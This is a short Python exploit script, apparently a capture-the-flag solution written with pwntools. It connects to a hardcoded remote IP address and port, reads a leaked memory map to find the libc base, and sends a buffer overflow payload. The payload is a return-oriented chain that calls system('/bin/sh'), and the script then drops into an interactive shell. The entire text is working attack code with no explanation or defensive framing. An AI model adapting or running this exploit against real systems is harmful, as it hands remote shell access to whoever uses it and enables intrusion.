#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
context.log_level = 'info'

HOST, PORT = "109.233.56.90", 11673
libc_sh = 0x18a156
libc_sys = 0x48f20
OFF = 72

G_POP_RDI = 0x4011b3
RET = 0x4011b7

def parse_libc_base(blob):
    for line in blob.split(b"\n"):
        if b"libc" in line and b"-" in line[:20]:
            return int(line.split(b"-")[0], 16)

io = remote(HOST, PORT)
leak = io.recvuntil(b"add your own!")
base = parse_libc_base(leak)
log.success("libc base = %#x", base)

payload = b"A"*OFF
payload += p64(G_POP_RDI)
payload += p64(base + libc_sh)
payload += p64(RET)
payload += p64(base + libc_sys)

io.sendline(payload)
io.interactive()
